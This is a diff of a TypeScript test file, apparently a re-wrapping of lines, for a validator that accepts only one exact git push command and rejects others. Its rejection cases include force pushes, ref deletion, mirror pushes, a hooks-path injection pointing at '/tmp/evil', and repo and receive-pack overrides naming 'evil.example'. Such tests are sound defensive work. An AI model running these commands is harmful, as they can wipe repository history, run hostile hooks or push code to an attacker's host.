@@ -42,13 +42,34 @@ describe('parseExactBoundPushIntent (issue #2108 exact-intent taxonomy)', () => 
 		// The reason depends on token position (extra tokens vs flag in the
 		// remote/refspec slot); every variant is rejected either way.
 		const rejections: Array<[string, string]> = [
-			[`git push --force origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push -f origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --force-with-lease origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --force-with-lease=other ${ARMED.localHead}:refs/heads/pr-head`, 'flag-or-option'],
-			[`git push origin -f ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push origin --force ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push origin ${ARMED.localHead}:refs/heads/pr-head -f`, 'token-shape'],
+			[
+				`git push --force origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push -f origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --force-with-lease origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --force-with-lease=other ${ARMED.localHead}:refs/heads/pr-head`,
+				'flag-or-option',
+			],
+			[
+				`git push origin -f ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push origin --force ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push origin ${ARMED.localHead}:refs/heads/pr-head -f`,
+				'token-shape',
+			],
 			[`git push origin --force`, 'flag-or-option'],
 		];
 		for (const [command, reason] of rejections) {
@@ -62,10 +83,7 @@ describe('parseExactBoundPushIntent (issue #2108 exact-intent taxonomy)', () => 
 		const rejections: Array<[string, string]> = [
 			[`git push origin :refs/heads/pr-head`, 'delete-refspec'],
 			[`git push origin --delete pr-head`, 'token-shape'],
-			[
-				`git push origin ${ARMED.localHead}:refs/tags/v1`,
-				'invalid-dest-ref',
-			],
+			[`git push origin ${ARMED.localHead}:refs/tags/v1`, 'invalid-dest-ref'],
 			[`git push origin --tags`, 'flag-or-option'],
 			[`git push --mirror origin`, 'flag-or-option'],
 			[`git push origin --all`, 'flag-or-option'],
@@ -77,14 +95,8 @@ describe('parseExactBoundPushIntent (issue #2108 exact-intent taxonomy)', () => 
 				`git push origin refs/heads/pr-head:refs/heads/other`,
 				'source-mismatch',
 			],
-			[
-				`git push origin "*:refs/heads/pr-head"`,
-				'token-shape',
-			],
-			[
-				`git push origin ${ARMED.localHead}:refs/heads/*`,
-				'wildcard-refspec',
-			],
+			[`git push origin "*:refs/heads/pr-head"`, 'token-shape'],
+			[`git push origin ${ARMED.localHead}:refs/heads/*`, 'wildcard-refspec'],
 			[`git push origin HEAD:refs/heads/pr-head`, 'source-mismatch'],
 			[`git push origin ${ARMED.localHead}`, 'invalid-dest-ref'],
 		];
@@ -97,8 +109,14 @@ describe('parseExactBoundPushIntent (issue #2108 exact-intent taxonomy)', () => 
 
 	test('rejects alternate remote, alternate branch, and source mismatch', () => {
 		const rejections: Array<[string, string]> = [
-			[`git push other ${ARMED.localHead}:refs/heads/pr-head`, 'remote-mismatch'],
-			[`git push upstream ${ARMED.localHead}:refs/heads/pr-head`, 'remote-mismatch'],
+			[
+				`git push other ${ARMED.localHead}:refs/heads/pr-head`,
+				'remote-mismatch',
+			],
+			[
+				`git push upstream ${ARMED.localHead}:refs/heads/pr-head`,
+				'remote-mismatch',
+			],
 			[
 				`git push origin ${ARMED.localHead}:refs/heads/PR-HEAD`,
 				'branch-mismatch',
@@ -153,15 +171,42 @@ describe('parseExactBoundPushIntent (issue #2108 exact-intent taxonomy)', () => 
 
 	test('rejects config injection, repo override, and push-option flags', () => {
 		const rejections: Array<[string, string]> = [
-			[`git push -c core.hooksPath=/tmp/evil origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --repo=https://evil.example origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --exec=evil-receive-pack origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --receive-pack=evil origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --push-option=x origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push -u origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --atomic origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --prune origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
-			[`git push --follow-tags origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
+			[
+				`git push -c core.hooksPath=/tmp/evil origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --repo=https://evil.example origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --exec=evil-receive-pack origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --receive-pack=evil origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --push-option=x origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push -u origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --atomic origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --prune origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
+			[
+				`git push --follow-tags origin ${ARMED.localHead}:refs/heads/pr-head`,
+				'token-shape',
+			],
 			[`git push origin --push-option=x`, 'flag-or-option'],
 			[`git push --repo=https://evil.example`, 'token-shape'],
 			[`git push -c core.hooksPath=/tmp/evil`, 'flag-or-option'],
